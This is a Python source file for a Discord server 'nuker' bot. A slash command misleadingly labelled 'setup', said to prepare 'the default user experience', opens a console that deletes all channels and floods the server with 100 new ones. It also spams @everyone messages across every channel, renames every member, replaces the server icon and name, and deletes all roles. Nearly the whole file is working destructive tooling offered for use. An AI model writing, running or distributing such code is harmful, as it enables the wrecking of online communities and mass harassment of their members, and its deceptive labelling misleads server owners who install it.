import discord
from discord.ext import commands
import requests
from colorist import Color
from colorist import Effect

TOKEN = 'YOUR_TOKEN_HERE'

intents = discord.Intents.all()
bot = commands.Bot(intents=intents)

@bot.event
async def on_ready():
  print(f'Logged in as {bot.user}')


@bot.slash_command(name="setup", description='Prepares the bot with the default user experience')
async def setup(ctx):
  print("Commands: \nremoveall - removes all channels and replaces them\nspam - sends a message with @everyone appended \nnick - nicks all users with an input \nicon - replaces the icon and name of the server \nrole - removes all available roles")
  while True:
    command = input(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > ")
    
    
    if (command == "removeall"):
      channelName = input("  Channel Name: ")
      for channel in ctx.guild.channels:
        await channel.delete()

      for lp in range(100):
        try:
          await ctx.guild.create_text_channel(channelName)
        except:
          if not (channelName == " "):
            print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Create")

    
    if (command == "spam"):
      message = input(  "Message: ")
      spamAmountString = input("  Messages per Channel: ")
      spamAmount = int(spamAmountString)
      for lp in range(spamAmount):
        for channel in ctx.guild.channels:
          try:
            await channel.send(message + "@everyone")
          except:
            print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Send")

    if (command == "icon"):
      icon = input("  Icon Link: ") # https://townsquare.media/site/40/files/2017/03/Dog-.jpg?w=1200&h=0&zc=1&s=0&a=t&q=89
      name = input("  New Name: ")
      response = requests.get(icon)
      image_data = response.content
      try:
        await ctx.guild.edit(icon=image_data)
        await ctx.guild.edit(name=name)
      except:
        print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Edit")

    if (command == "nick"):
      nickName = input(" New Nickname: ")
      for member in ctx.guild.members:
        try:
          await member.edit(nick=nickName)
        except:
          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed nickname")

    if (command == "role"):
      for role in ctx.guild.roles:  
        try:  
          await role.delete()
          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Deleted {role.name}")
        except:
          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Cannot Delete {role.name}")

try:
  bot.run(TOKEN)
except:
  print("Invalid token. Please replace TOKEN='YOUR_TOKEN_HERE' with your bots token.")
